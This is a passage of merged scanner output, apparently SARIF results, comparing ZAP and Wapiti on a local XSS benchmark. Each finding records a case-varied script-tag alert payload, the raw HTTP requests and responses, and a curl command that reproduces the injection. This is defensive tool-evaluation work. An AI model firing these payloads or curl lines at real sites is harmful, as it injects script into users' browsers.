            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02224', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02224.html?BenchmarkTest02224=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDIyMjQ9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02224', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02224.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02224=%3CScRiPt%3Ealert%28%27wiozbqe8d3%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:26:00 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('wiozbqe8d3')</sCrIpT>.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02225",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02225?secure=default&productID=default&foo=foo&BenchmarkTest02225=%3CScRiPt%3Ealert%28%27w8lz9q2ns1%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w8lz9q2ns1')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w8lz9q2ns1')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02225\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02225.html\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest02225=%3CScRiPt%3Ealert%28%27w8lz9q2ns1%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02225"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02225', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02225.html?BenchmarkTest02225=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAyMjI1PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02225', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02225.html', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest02225=%3CScRiPt%3Ealert%28%27w8lz9q2ns1%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:00 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w8lz9q2ns1')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02227",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02227?BenchmarkTest02227=%3CScRiPt%3Ealert%28%27w5yg5ltlpd%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w5yg5ltlpd')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w5yg5ltlpd')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02227\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02227.html\" -d \"BenchmarkTest02227=%3CScRiPt%3Ealert%28%27w5yg5ltlpd%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02227"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02227', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02227.html?BenchmarkTest02227=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyMjI3PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02227', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02227.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02227=%3CScRiPt%3Ealert%28%27w5yg5ltlpd%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:26:01 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w5yg5ltlpd')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02232",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02232?BenchmarkTest02232=%3CScRiPt%3Ealert%28%27wr11s28jjl%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wr11s28jjl')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wr11s28jjl')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02232\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02232.html?BenchmarkTest02232=SafeText\" -d \"BenchmarkTest02232=%3CScRiPt%3Ealert%28%27wr11s28jjl%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02232"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02232', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02232.html?BenchmarkTest02232=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyMjMyPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02232', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02232.html?BenchmarkTest02232=SafeText', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02232=%3CScRiPt%3Ealert%28%27wr11s28jjl%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:01 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wr11s28jjl')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02234",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02234?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02234=%3CScRiPt%3Ealert%28%27wbj3ywk41v%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wbj3ywk41v')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wbj3ywk41v')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02234\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02234.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02234=%3CScRiPt%3Ealert%28%27wbj3ywk41v%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02234"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02234', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02234.html?BenchmarkTest02234=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDIyMzQ9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02234', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02234.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02234=%3CScRiPt%3Ealert%28%27wbj3ywk41v%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:26:01 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wbj3ywk41v')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02241",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02241?BenchmarkTest02241=SafeText&BenchmarkTest02241=Movies&BenchmarkTest02241=Writing&BenchmarkTest02241=%3CScRiPt%3Ealert%28%27w6lun9xtlj%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
